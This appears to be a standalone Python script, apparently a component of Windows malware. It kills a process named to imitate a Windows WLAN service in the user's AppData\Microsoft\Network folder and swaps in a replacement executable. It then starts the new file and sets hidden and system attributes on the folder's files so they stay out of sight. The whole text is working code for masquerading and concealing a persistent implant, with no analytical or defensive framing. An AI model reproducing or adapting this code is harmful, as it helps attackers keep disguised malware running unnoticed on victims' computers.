from os import remove, rename, startfile, path, getenv
from subprocess import run
from time import sleep

sleep(2)
target_path = path.join(getenv("APPDATA"), "Microsoft", "Network", "wlanhostsvc.exe")
ms32_path = path.join(getenv("APPDATA"), "Microsoft", "Network", "ms32-1.exe")

if "wlanhostsvc.exe" in run("tasklist", shell=True, text=True, capture_output=True).stdout:
    run("taskkill /f /im wlanhostsvc.exe")
sleep(0.6)

if path.exists(target_path):
    remove(target_path)

rename(ms32_path, target_path)
startfile(target_path)
network_folder = path.join(getenv("APPDATA"), "Microsoft", "Network")
listing = run(f'dir "{network_folder}" /b', shell=True, text=True, capture_output=True)
listing = listing.stdout.strip().split("\n")

for name in listing:
    if name != "Connections":
        full_path = path.join(network_folder, name)
        run(["attrib", "+h", "+s", full_path])
